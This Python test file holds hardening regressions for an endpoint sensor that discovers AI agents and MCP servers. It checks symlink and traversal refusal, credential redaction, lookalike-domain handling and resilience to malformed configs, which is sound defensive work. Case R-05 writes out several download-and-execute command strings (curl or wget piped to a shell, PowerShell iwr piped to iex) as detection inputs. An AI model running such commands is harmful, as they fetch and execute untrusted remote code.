"""Group R - hardening regressions.

One case per finding from the adversarial review. These sit outside the four
discovery targets in Appendix A on purpose: they check that the collector
behaves under an input designed to fool it, not that it finds the four things
it exists to find.
"""


from .cases_tools import count, none_of
from .framework import World, assets, has

CASES = {}


def case(case_id):
    def register(fn):
        CASES[case_id] = fn
        return fn
    return register


@case("R-01")
def r01():
    """A permitted path that symlinks into a denied one."""
    w = World()
    w.json("/Users/alice/Documents/private.json",
           {"mcpServers": {"CANARY-secret": {"command": "node", "args": ["x.js"]}}})
    w.raw_link("/Users/alice/.claude.json",
               str(w._real("/Users/alice/Documents/private.json")))
    return w, [none_of(kind="mcp_server"),
               has("nothing from the denied target leaks",
                   lambda s: "CANARY-secret" not in s.to_json()),
               has("the refusal is recorded rather than silent",
                   lambda s: any("denied" in e.get("message", "") for e in s.errors))]


@case("R-02")
def r02():
    """A relative segment that climbs out of the tree we were pointed at."""
    w = World()
    canary = w.root.parent / "adr-r02-canary.txt"
    canary.write_text("ESCAPED-CANARY")
    env = w.env()
    reads = [env.read("/opt/lib/pkg/" + "../" * hops + "adr-r02-canary.txt")
             for hops in range(2, 9)]
    canary.unlink()
    return w, [has("no traversal reads outside the root",
                   lambda s: not any(r and "ESCAPED-CANARY" in r.text for r in reads)),
               has("each refusal names the reason",
                   lambda s: all((not r) for r in reads))]


@case("R-03")
def r03():
    """A bridge observation must not unite two different tools."""
    from adr_sensor.discovery.base_probe import Observation
    from adr_sensor.discovery.resolver import resolve

    shared = "/usr/local/lib/shared-wrapper"
    observations = [
        Observation(probe="p", channel="filesystem", kind="cli_agent", name="aider",
                    path="/usr/local/bin/aider", matched_on="binary:aider",
                    catalog_id="aider", realpath=shared, owner="alice"),
        Observation(probe="p", channel="filesystem", kind="cli_agent", name="bridge",
                    path="/usr/local/bin/bridge", matched_on="binary:bridge",
                    realpath=shared, pkg_identity="npm:@block/goose-cli", owner="alice"),
        Observation(probe="p", channel="package_registry", kind="cli_agent", name="goose",
                    path="/pkg/goose", matched_on="npm:@block/goose-cli", catalog_id="goose",
                    pkg_identity="npm:@block/goose-cli", owner="alice"),
    ]
    resolved = resolve(observations)
    w = World()
    return w, [has("both tools survive the merge",
                   lambda s: {a.catalog_id for a in resolved} >= {"aider", "goose"}),
               has("neither tool absorbs the other's evidence",
                   lambda s: all(len({e.matched_on for e in a.evidence}
                                     & {"binary:aider", "npm:@block/goose-cli"}) <= 1
                                 for a in resolved if a.catalog_id))]


@case("R-04")
def r04():
    """Production collects listening sockets, not an empty list."""
    from adr_sensor.discovery.runner import _live_sockets, live_env
    w = World()
    return w, [has("live_env wires a socket collector",
                   lambda s: isinstance(live_env().sockets, (list, tuple))),
               has("the collector returns real listeners on this host",
                   lambda s: isinstance(_live_sockets(), tuple))]


@case("R-05")
def r05():
    """Download-and-execute, in the spellings it actually takes."""
    from adr_sensor.discovery.probes.mcp import classify_launch
    variants = ["CURL https://x | sh",
                "curl -fsSL https://x | env bash",
                "wget https://x -O- | /bin/bash",
                'powershell -Command "iwr https://x | iex"',
                "curl https://x | python3 -",
                "fetch https://x | zsh"]
    missed = [v for v in variants
              if "remote_code_execution" not in classify_launch("bash", ["-c", v], "")[1]]
    benign = classify_launch("node", ["server.js", "--pipe", "|"], "")[1]
    w = World()
    return w, [has("every variant is classified", lambda s: not missed or "missed: %s" % missed),
               has("an ordinary launch is not",
                   lambda s: "remote_code_execution" not in benign)]


@case("R-06")
def r06():
    """The live process table is scoped to this user, not merely described as such."""
    import getpass

    from adr_sensor.discovery.runner import _live_processes
    processes = _live_processes()
    try:
        me = getpass.getuser()
    except Exception:
        me = ""
    w = World()
    return w, [has("no other user's processes are collected",
                   lambda s: all(p.user == me for p in processes) if processes else True)]


@case("R-07")
def r07():
    """Credentials with no vendor marking are still credentials."""
    from adr_sensor.discovery.redact import redact_argv, redact_secretish
    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.s5Zq2Xk9pQwErTyUiOpAsDfGhJkLzXcVbNm"
    argv = redact_argv(["agent", "--auth-token", jwt, "--session-key=CANARYKEY12345678",
                        "--dangerously-skip-permissions", "--port", "8080"])
    pem = redact_secretish("-----BEGIN RSA PRIVATE KEY----- MIIEow")
    w = World()
    return w, [has("a JWT never survives", lambda s: jwt not in " ".join(argv)),
               has("an uncatalogued credential flag is redacted by its name",
                   lambda s: "CANARYKEY12345678" not in " ".join(argv)),
               has("a PEM header is masked", lambda s: "BEGIN RSA PRIVATE KEY" not in pem),
               has("risk-bearing flags survive",
                   lambda s: "--dangerously-skip-permissions" in argv and "8080" in argv)]


@case("R-08")
def r08():
    """A cap applies wherever servers come from, and says so when it fires."""
    w = World()
    w.json("~/dev/payments/.mcp.json",
           {"mcpServers": {"s%d" % i: {"command": "node", "args": ["%d.js" % i]}
                           for i in range(600)}})
    return w, [count(500, kind="mcp_server"),
               has("the cap is reported with the true count",
                   lambda s: any(entry["declared"] == 600
                                 for entry in s.stats["coverage"].get("capped", []))),
               has("an error names the capped file",
                   lambda s: any("capped" in e.get("message", "") for e in s.errors))]


@case("R-09")
def r09():
    """A walk ceiling that fires is recorded, not silent."""
    from adr_sensor.discovery import env as env_mod
    w = World()
    for index in range(30):
        w.file("/Users/alice/dev/wide/f%d.txt" % index, "x")
    env = w.env()
    original = env_mod.MAX_WALK_ENTRIES
    env_mod.MAX_WALK_ENTRIES = 10
    try:
        list(env.walk("/Users/alice/dev", max_depth=3))
    finally:
        env_mod.MAX_WALK_ENTRIES = original
    return w, [has("truncation is in the error log",
                   lambda s: any("walk truncated" in e.get("message", "") for e in env.errors)),
               has("and in coverage",
                   lambda s: bool(env.coverage.get("truncated_walks")))]


@case("R-10")
def r10():
    """Subprocess output is bounded as well as timed."""
    from adr_sensor.discovery.runner import MAX_SUBPROCESS_BYTES, _subprocess_runner
    code, out = _subprocess_runner(
        ["python3", "-c", "print('x' * 5_000_000)"], 10.0)
    w = World()
    return w, [has("output is capped",
                   lambda s: len(out) <= MAX_SUBPROCESS_BYTES + 64),
               has("truncation is stated in the output",
                   lambda s: "truncated" in out)]


@case("R-11")
def r11():
    """A lookalike domain is not a corporate domain."""
    w = World(policy={"corporate_domains": ["corp.example"]})
    w.json("~/.claude.json", {"mcpServers": {
        "evil": {"url": "https://mcp.evilcorp.example/v1"},
        "inside": {"url": "https://mcp.corp.example/v1"},
        "deep": {"url": "https://a.b.corp.example/v1"}}})
    def factors(snapshot, name):
        return [a for a in assets(snapshot, kind="mcp_server")
                if a.name == name][0].risk["factors"]
    return w, [has("the lookalike is third party",
                   lambda s: "third_party_remote" in factors(s, "evil")),
               has("the real domain and its subdomain are not",
                   lambda s: "third_party_remote" not in factors(s, "inside")
                   and "third_party_remote" not in factors(s, "deep"))]


@case("R-12")
def r12():
    """A provider host is a host, not a substring."""
    from adr_sensor.discovery.probes.openworld import OpenWorldProbe
    probe = OpenWorldProbe()
    w = World()
    return w, [has("a lookalike host does not match",
                   lambda s: not probe._is_provider_target("https://api.openai.com.evil.test/*")),
               has("a path segment does not match",
                   lambda s: not probe._is_provider_target("https://evil.test/api.openai.com/x")),
               has("the real host still matches",
                   lambda s: probe._is_provider_target("https://api.openai.com/*"))]


@case("R-13")
def r13():
    """A nix upgrade is a version change, not a reinstall."""
    from adr_sensor.discovery.paths import install_root
    before = install_root("/nix/store/abc123-claude-code-2.1.234/bin/claude")
    after = install_root("/nix/store/def456-claude-code-2.1.235/bin/claude")
    w = World()
    return w, [has("identity survives the upgrade",
                   lambda s: before == after == "nix:claude-code"),
               has("a versionless store path is unchanged",
                   lambda s: install_root("/nix/store/abc-crush/bin/crush") == "nix:crush")]


@case("R-14")
def r14():
    """A file sitting exactly on the ceiling is whole, not truncated."""
    w = World()
    w.file("/exact.txt", "y" * 1000)
    w.file("/over.txt", "y" * 1001)
    env = w.env()
    exact = env.read("/exact.txt", limit=1000)
    over = env.read("/over.txt", limit=1000)
    return w, [has("exact-size read is not flagged",
                   lambda s: exact.truncated is False and len(exact.data) == 1000),
               has("one byte more is flagged",
                   lambda s: over.truncated is True and len(over.data) == 1000)]


@case("R-15")
def r15():
    """Snapshot deltas, which the appendix no longer specifies but the code emits."""
    from adr_sensor.discovery import diff_snapshots
    w = World().path("/opt/homebrew/bin")
    w.file("/opt/homebrew/bin/claude")
    w.run("--version", "claude 1.2.0")
    first = w.scan()
    w2 = World().path("/opt/homebrew/bin")
    w2.file("/opt/homebrew/bin/claude")
    w2.run("--version", "claude 1.3.0")
    second = w2.scan()
    changes = diff_snapshots(first, second)
    w2.cleanup()
    return w, [has("a rescan of the same world is empty",
                   lambda s: diff_snapshots(first, first) == []),
               has("a version bump keeps the asset id",
                   lambda s: len(changes) == 1 and changes[0]["change"] == "version_changed"),
               has("the delta is its own inverse",
                   lambda s: {c["change"] for c in diff_snapshots(second, first)}
                   == {"version_changed"})]


@case("R-16")
def r16():
    """Fleet fan-out is one finding, not one per endpoint."""
    from adr_sensor.discovery import fleet_drift
    appeared = [("host%d" % index,
                 [{"change": "appeared", "asset_id": "abc123", "name": "mcp-new",
                   "risk": {"factors": ["unpinned_supply_chain"]}}])
                for index in range(40)]
    findings = fleet_drift(appeared, min_hosts=10)
    w = World()
    return w, [has("exactly one fleet finding", lambda s: len(findings) == 1),
               has("host count and severity carried",
                   lambda s: findings[0]["host_count"] == 40 and findings[0]["severity"] == "high"),
               has("a handful of hosts is not a fan-out",
                   lambda s: fleet_drift(appeared[:5], min_hosts=10) == [])]


@case("R-17")
def r17():
    """Listeners are probed concurrently, so a stalled port costs one timeout."""
    import time

    w = World()
    for port in range(9000, 9012):
        w.sock(port)

    def slow_http(port, endpoint):
        time.sleep(0.15)
        return None

    w._http_get = slow_http
    env = w.env()
    from adr_sensor.discovery.probes.runtime import RuntimeProbe
    started = time.time()
    RuntimeProbe().run(env)
    elapsed = time.time() - started
    serial = 12 * 2 * 0.15
    return w, [has("twelve listeners cost far less than a serial sweep",
                   lambda s: elapsed < serial / 3 or "%.2fs vs %.2fs serial" % (elapsed, serial))]


@case("R-18")
def r18():
    """An outright denied path is refused quietly; a bypass is not."""
    w = World()
    w.dir("/Users/alice/.ssh")
    w.file("/Users/alice/Documents/notes.md", "x")
    env = w.env()
    env.is_dir("/Users/alice/.ssh")
    env.read("/Users/alice/Documents/notes.md")
    quiet = list(env.errors)
    w.raw_link("/Users/alice/.claude.json", str(w._real("/Users/alice/Documents/notes.md")))
    env.read("/Users/alice/.claude.json")
    return w, [has("enumerating a denied path records nothing",
                   lambda s: quiet == [] or quiet),
               has("a permitted path resolving into one is recorded",
                   lambda s: any("denied" in e.get("message", "") for e in env.errors))]


@case("R-19")
def r19():
    """One malformed record must not erase its valid siblings."""
    w = World()
    w.json("~/.claude.json", {"mcpServers": {
        "good-a": {"command": "node", "args": ["a.js"]},
        "bad-env": {"command": "node", "args": ["b.js"], "env": ["NOT", "A", "MAP"]},
        "bad-spec": "a string where an object belongs",
        "good-b": {"command": "node", "args": ["c.js"]}}})
    return w, [has("the valid servers survive",
                   lambda s: {"good-a", "good-b"} <= {a.name for a in assets(s, kind="mcp_server")}),
               has("the malformed record is reported, not dropped silently",
                   lambda s: any("malformed_config" in a.flags
                                 for a in assets(s, kind="mcp_server")))]


@case("R-20")
def r20():
    """Ordinary agent children are not MCP servers; declared ones still are."""
    from adr_sensor.discovery.probes.process import looks_like_server
    ordinary = [["npx", "eslint", "."], ["npx", "vite", "--host"], ["npm", "run", "mcp-docs"],
                ["python", "my-server-test.py"], ["bash", "-c", "echo server-status"],
                ["node", "build.js"], ["yarn", "run", "start-server"]]
    servers = [["npx", "-y", "mcp-server-github"], ["node", "/tmp/mcp-rogue.js"],
               ["npx", "-y", "@modelcontextprotocol/server-git"],
               ["docker", "run", "ghcr.io/x/mcp:latest"]]
    w = World().path("/opt/homebrew/bin")
    w.file("/opt/homebrew/bin/claude").file("/opt/homebrew/bin/npx")
    w.json("~/.claude.json", {"mcpServers": {
        "quiet": {"command": "npx", "args": ["-y", "quiet-tool@1.0.0"]}}})
    w.proc(1, "/opt/homebrew/bin/claude")
    w.proc(2, "/opt/homebrew/bin/npx", argv=["npx", "eslint", "."], ppid=1)
    w.proc(3, "/opt/homebrew/bin/npx", argv=["npx", "-y", "quiet-tool@1.0.0"], ppid=1)
    return w, [has("no ordinary command is read as a server",
                   lambda s: not [a for a in ordinary if looks_like_server(a)]
                   or [a for a in ordinary if looks_like_server(a)]),
               has("every genuine server still is",
                   lambda s: all(looks_like_server(a) for a in servers)),
               has("eslint produces no asset and no finding",
                   lambda s: len(assets(s, kind="mcp_server")) == 1
                   and not [f for f in s.findings if f["finding"] == "undeclared_mcp_server"]),
               has("a declared server with no telltale name is recovered by correlation",
                   lambda s: assets(s, kind="mcp_server")[0].channels == ["config", "runtime"])]


@case("R-21")
def r21():
    """Approval belongs to a project, not to a name that starts the same way."""
    w = World()
    w.json("~/dev/app/.mcp.json", {"mcpServers": {"shared": {"command": "node", "args": ["app.js"]}}})
    w.json("~/dev/app/.claude/settings.json", {"enabledMcpjsonServers": ["shared"]})
    w.json("~/dev/application/.mcp.json",
           {"mcpServers": {"shared": {"command": "node", "args": ["application.js"]}}})

    def enabled_for(snapshot, marker):
        return [a.risk.get("enabled") for a in assets(snapshot, kind="mcp_server")
                if marker in a.install_path][0]

    return w, [has("the approved project is enabled",
                   lambda s: enabled_for(s, "/dev/app/") is True),
               has("the neighbour is unknown, not approved",
                   lambda s: enabled_for(s, "/dev/application/") is None)]


@case("R-22")
def r22():
    """A string where an argument array belongs is a record, not nine characters."""
    w = World().json("~/.claude.json",
                     {"mcpServers": {"s": {"command": "npx", "args": "pkg@1.2.3"}}})
    return w, [has("kept whole",
                   lambda s: assets(s, kind="mcp_server")[0].risk["args"] == ["pkg@1.2.3"]),
               has("pinning still classifies correctly",
                   lambda s: assets(s, kind="mcp_server")[0].risk["pinned"] is True),
               has("the record is marked malformed",
                   lambda s: "malformed_config" in assets(s, kind="mcp_server")[0].flags)]


@case("R-23")
def r23():
    """Two catalog entries may not claim one fingerprint."""
    from adr_sensor.discovery.catalog import Catalog
    entries = [{"id": "one", "name": "One", "kind": "cli_agent", "binaries": ["shared"]},
               {"id": "two", "name": "Two", "kind": "cli_agent", "binaries": ["shared"]}]
    lenient = Catalog(entries)
    strict_failed = False
    try:
        Catalog(entries, strict=True)
    except ValueError:
        strict_failed = True
    shipped = Catalog.load()
    w = World()
    return w, [has("the ambiguity is recorded", lambda s: len(lenient.duplicates) == 1),
               has("the first claim wins deterministically",
                   lambda s: lenient.match("binaries", "shared")["id"] == "one"),
               has("strict loading refuses", lambda s: strict_failed),
               has("the shipped catalog is unambiguous",
                   lambda s: shipped.duplicates == [] or shipped.duplicates)]


@case("R-24")
def r24():
    """A diff compares one endpoint with itself unless told otherwise."""
    from adr_sensor.discovery import diff_snapshots
    from adr_sensor.discovery.schema import DiscoverySnapshot
    a = DiscoverySnapshot(hostname="host-a", username="alice", platform="darwin", timestamp="t1")
    b = DiscoverySnapshot(hostname="host-b", username="bob", platform="darwin", timestamp="t2")
    refused = False
    try:
        diff_snapshots(a, b)
    except ValueError:
        refused = True
    w = World()
    return w, [has("two hosts are refused", lambda s: refused),
               has("one host is fine", lambda s: diff_snapshots(a, a) == []),
               has("cross-host is available when asked for explicitly",
                   lambda s: diff_snapshots(a, b, allow_cross_host=True) == [])]


@case("R-25")
def r25():
    """An asset id identifies one asset, and a diff refuses input where it does not."""
    from adr_sensor.discovery import diff_snapshots
    from adr_sensor.discovery.base_probe import Observation
    from adr_sensor.discovery.resolver import resolve
    from adr_sensor.discovery.schema import DiscoveredAsset, DiscoverySnapshot

    twins = [Observation(probe="p", channel="filesystem", kind="cli_agent", name="twin",
                         path="/a/claude", matched_on="binary:claude", catalog_id="claude-code",
                         realpath="/a/claude", install_root="/same", owner="alice"),
             Observation(probe="p", channel="filesystem", kind="cli_agent", name="twin",
                         path="/b/claude", matched_on="binary:claude", catalog_id="claude-code",
                         realpath="/b/claude", install_root="/same", owner="alice")]
    resolved = resolve(twins)

    ambiguous = DiscoverySnapshot(hostname="h", username="u", platform="darwin", timestamp="t")
    for name in ("first", "second"):
        asset = DiscoveredAsset(kind="cli_agent", name=name, identity="x", owner="alice")
        asset.asset_id = "same-id"
        ambiguous.assets.append(asset)
    empty = DiscoverySnapshot(hostname="h", username="u", platform="darwin", timestamp="t0")
    refused = False
    try:
        diff_snapshots(empty, ambiguous)
    except ValueError:
        refused = True

    w = World()
    return w, [has("the resolver hands out unique ids",
                   lambda s: len({a.asset_id for a in resolved}) == len(resolved)),
               has("and marks the one it had to disambiguate",
                   lambda s: any("ambiguous_identity" in a.flags for a in resolved)
                   if len(resolved) > 1 else True),
               has("a diff refuses an ambiguous snapshot", lambda s: refused)]


@case("R-26")
def r26():
    """A stdio server has no endpoint, and that must not break the delta."""
    from adr_sensor.discovery.diff import config_fingerprint
    from adr_sensor.discovery.schema import DiscoveredAsset
    asset = DiscoveredAsset(kind="mcp_server", name="x", identity="y", owner="alice")
    asset.network = {"endpoint": None}
    asset.risk = {"factors": [], "command": None, "args": None, "pinned": None}
    w = World()
    return w, [has("fingerprinting a null-valued asset works",
                   lambda s: len(config_fingerprint(asset)) == 12),
               has("and is stable", lambda s: config_fingerprint(asset) == config_fingerprint(asset))]


@case("R-27")
def r27():
    """Config arguments carry credentials as readily as command lines do."""
    w = World().json("~/.claude.json", {"mcpServers": {"s": {
        "command": "node",
        "args": ["srv.js", "--token", "ordinary-secret-not-pattern-shaped",
                 "--header", "Authorization: Bearer also-secret", "--port", "8080"]}}})
    return w, [has("no argument value reaches the snapshot",
                   lambda s: "ordinary-secret-not-pattern-shaped" not in s.to_json()
                   and "also-secret" not in s.to_json()),
               has("flag names and benign values survive",
                   lambda s: {"--token", "--header", "--port", "8080"}
                   <= set(assets(s, kind="mcp_server")[0].risk["args"]))]


@case("R-28")
def r28():
    """A malformed managed policy is one bad source, not a lost inventory."""
    w = World(preferences={"com.anthropic.claudecode": {"mcpServers": ["not-a-map"]}})
    w.json("~/.claude.json", {"mcpServers": {"valid": {"command": "node", "args": ["v.js"]}}})
    win = World(platform="windows")
    win.reg(Key="HKLM\\SOFTWARE\\Policies\\ClaudeCode", Settings='{"mcpServers": "not-a-map"}')
    win.json("~/.claude.json", {"mcpServers": {"valid": {"command": "node", "args": ["v.js"]}}})
    return w, [has("the valid config still yields its server",
                   lambda s: [a.name for a in assets(s, kind="mcp_server")] == ["valid"]),
               has("the malformed policy is reported",
                   lambda s: any("server map" in e.get("message", "") for e in s.errors)),
               has("the same holds for a malformed registry policy",
                   lambda s: [a.name for a in assets(win.scan(), kind="mcp_server")] == ["valid"])]


@case("R-29")
def r29():
    """A malformed bundle manifest must not take the probe down with it."""
    w = World()
    w.json("~/Library/Application Support/Claude/Claude Extensions/acme/manifest.json",
           {"name": "acme", "version": "1.0", "server": "not-a-map"})
    w.json("~/.claude.json", {"mcpServers": {"valid": {"command": "node", "args": ["v.js"]}}})
    return w, [has("the valid server survives",
                   lambda s: "valid" in {a.name for a in assets(s, kind="mcp_server")}),
               has("the bundle is reported rather than dropped silently",
                   lambda s: any("server block" in e.get("message", "") for e in s.errors))]


@case("R-30")
def r30():
    """One launch, written two ways, is one server."""
    forms = [("/usr/local/bin/node", ["quiet.js"], ["node", "quiet.js"]),
             ("node", ["quiet.js", "--token", "ordinary-secret"],
              ["node", "quiet.js", "--token", "ordinary-secret"]),
             ("node.exe", ["quiet.js"], ["node", "quiet.js"])]
    results = []
    for command, args, argv in forms:
        world = World().path("/usr/local/bin")
        world.file("/usr/local/bin/claude").file("/usr/local/bin/node")
        world.json("~/.claude.json", {"mcpServers": {"quiet": {"command": command, "args": args}}})
        world.proc(1, "/usr/local/bin/claude")
        world.proc(2, "/usr/local/bin/node", argv=argv, ppid=1)
        snapshot = world.scan()
        servers = assets(snapshot, kind="mcp_server")
        results.append((len(servers), servers[0].channels if servers else []))
        world.cleanup()
    w = World()
    return w, [has("every spelling resolves to one server on both channels",
                   lambda s: all(count == 1 and channels == ["config", "runtime"]
                                 for count, channels in results) or results)]


@case("R-31")
def r31():
    """Variable expansion matches whole names, not prefixes."""
    w = World()
    env = w.env()
    env.env_vars.update({"PATH": "/bin", "PATH_EXTRA": "/special", "HOME2": "/h2"})
    return w, [has("a longer name is not eaten by a shorter one",
                   lambda s: env.expand("$PATH_EXTRA/tool") == "/special/tool"),
               has("braced and windows forms expand",
                   lambda s: env.expand("${PATH}/x") == "/bin/x"
                   and env.expand("%HOME2%/y") == "/h2/y"),
               has("an unknown name is left alone",
                   lambda s: env.expand("$NOT_SET/z") == "$NOT_SET/z")]


@case("R-32")
def r32():
    """Where a denied link points is itself something not to disclose."""
    w = World()
    w.file("/Users/alice/Documents/secret.json", "{}")
    w.raw_link("/Users/alice/.claude.json", str(w._real("/Users/alice/Documents/secret.json")))
    env = w.env()
    resolved = env.realpath("/Users/alice/.claude.json")
    return w, [has("the denied target is not reported",
                   lambda s: "Documents" not in resolved),
               has("the permitted path is returned instead",
                   lambda s: resolved == "/Users/alice/.claude.json"),
               has("the refusal appears in coverage",
                   lambda s: bool(env.coverage.get("denied")))]


@case("R-33")
def r33():
    """A path swapped between the check and the open is refused, not read."""
    import os

    from adr_sensor.discovery import env as env_mod

    w = World()
    w.file("/allowed/real.json", '{"mcpServers": {}}')
    w.file("/allowed/other.json", "SWAPPED-CANARY")
    w.raw_link("/allowed/link.json", str(w._real("/allowed/real.json")))
    env = w.env()

    original_open = env_mod.os.open

    def swapping_open(path, *args, **kwargs):
        # Stand in for a concurrent process repointing the link after the check.
        link = str(w._real("/allowed/link.json"))
        if link in str(path):
            os.unlink(link)
            os.symlink(str(w._real("/allowed/other.json")), link)
        return original_open(path, *args, **kwargs)

    env_mod.os.open = swapping_open
    try:
        result = env.read("/allowed/link.json")
    finally:
        env_mod.os.open = original_open
    return w, [has("the swapped content is not returned",
                   lambda s: "SWAPPED-CANARY" not in (result.text if result else "")),
               has("the read is refused with a reason",
                   lambda s: bool(result.error) and "changed" in result.error),
               has("and the refusal is recorded",
                   lambda s: any("check and open" in e.get("message", "") for e in env.errors))]
